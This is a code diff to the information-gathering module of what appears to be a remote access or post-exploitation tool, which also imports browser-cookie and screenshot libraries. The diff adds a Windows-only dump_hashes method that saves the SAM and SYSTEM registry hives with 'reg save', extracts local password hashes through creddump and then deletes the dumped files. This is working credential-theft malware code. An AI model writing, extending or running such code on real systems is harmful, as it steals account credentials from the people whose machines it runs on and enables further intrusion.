@@ -20,10 +20,15 @@ import logging
 import browsercookie
 import base64
 import pyscreenshot
+from Crypto.Random import random # Cryptographically secure file names!
+import string
 from common import *
 from misc import Miscellaneous
+from execute import execute
+from creddump import hashdump
 
 ASCIIfy = Miscellaneous().ASCIIfy
+isadmin = Miscellaneous().isadmin
 
 class Information_Gathering:
 	"""
@@ -452,5 +457,28 @@ class Information_Gathering:
 		except Exception as e:
 			logging.error(e)
 			return "AAAA|1|1|"
+			
+	@windows_only
+	def dump_hashes(self):
+		sam_name = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
+		system_name = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
+		try:
+			if not isadmin: return "[-]You need to have admin privileges to run hashdump."
+
+			execute.execute_shell_command("reg save HKLM\\SAM "+sam_name)
+			execute.execute_shell_command("reg save HKLM\\SYSTEM "+system_name)
+			
+			output = hashdump.dump_file_hashes(system_name, sam_name)
+			
+			os.remove(sam_name)
+			os.remove(system_name)
+			
+			return output
+		except Exception as e:
+			try:
+				os.remove(sam_name)
+				os.remove(system_name)
+			except: pass
+			return str(e)
 		
 info = Information_Gathering()
